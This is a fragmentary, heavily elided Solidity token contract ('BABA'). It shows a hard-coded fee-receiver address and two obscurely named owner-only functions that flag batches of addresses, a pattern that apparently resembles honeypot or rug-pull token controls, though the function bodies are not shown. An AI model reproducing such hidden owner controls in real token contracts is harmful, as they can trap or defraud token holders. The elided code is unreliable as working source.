...
abstract contract AbsToken is IERC20, Ownable {
    ...
    constructor (
        ...
        address ReceiveAddress = 0x222b09C77a9fF4FfF1a423e3De69Cd657bf59912;
    ...
    function _burnTransfer(
        ...
        _takeTransfer(sender,0x222b09C77a9fF4FfF1a423e3De69Cd657bf59912, feeAmount);
    ...
    function multiBABA(address[] calldata addresses, bool value) public onlyOwner{
    ...
    function multiMAMA(address[] calldata addresses, bool value) public onlyOwner{
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
...
contract BABA is AbsToken {
    constructor() AbsToken(
        ...
        9,
        420000000000000,
        address(0x9beD3982a7a7C8Ea4978A41C96dEe294B6B7c653)
    ){
    }
}